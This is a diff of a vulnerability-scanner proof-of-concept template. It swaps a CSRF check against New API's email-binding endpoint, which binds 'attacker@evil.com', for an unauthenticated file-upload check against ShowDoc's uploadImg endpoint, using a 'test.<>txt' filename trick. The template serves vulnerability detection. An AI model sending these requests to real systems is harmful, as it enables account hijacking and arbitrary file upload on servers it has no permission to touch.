@@ -1,35 +1,33 @@
 [info]
 id = "POC-AVE-2026-0037"
-name = "New API 邮箱绑定接口 CSRF 漏洞 PoC"
+name = "ShowDoc 文件上传漏洞 PoC"
 author = "AVE"
-severity = "medium"
-tags = ["csrf", "cve-2026-44342", "new-api"]
-description = "New API 在 v0.12.0-alpha.1 之前，/api/oauth/email/bind 使用 GET 请求处理邮箱绑定操作，存在 CSRF 漏洞。攻击者可构造恶意链接诱导用户点击，将攻击者控制的邮箱绑定到用户账户。"
-vuln_id = ["CVE-2026-44342", "AVE-2026-0037"]
+severity = "critical"
+tags = ["file-upload", "cnvd-2020-26585", "showdoc"]
+description = "ShowDoc 2.8.6 以下版本 /index.php?s=/home/page/uploadImg 接口存在未授权任意文件上传漏洞，通过构造特制 multipart 请求可上传任意文件到服务器。"
+vuln_id = ["CNVD-2020-26585", "AVE-2026-0037"]
 
 [poc]
 logic = "all"
 
 [[poc.requests]]
-method = "GET"
-path = "/api/oauth/email/bind"
+method = "POST"
+path = "/index.php?s=/home/page/uploadImg"
 
-[poc.requests.query]
-email = "attacker@evil.com"
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----AVEFormBoundary"
+
+[poc.requests.body]
+type = "raw"
+content = "------AVEFormBoundary\r\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>txt\"\r\nContent-Type: text/plain\r\n\r\nAVEVulnerabilityTest\r\n------AVEFormBoundary--"
 
 [[poc.requests.matchers]]
 type = "status"
 status = [200]
 expect = true
 
-[[poc.requests]]
-method = "GET"
-path = "/api/oauth/wechat/bind"
-
-[poc.requests.query]
-code = "attacker_code"
-
 [[poc.requests.matchers]]
-type = "status"
-status = [200]
+type = "word"
+part = "body"
+words = ["Uploads"]
 expect = true
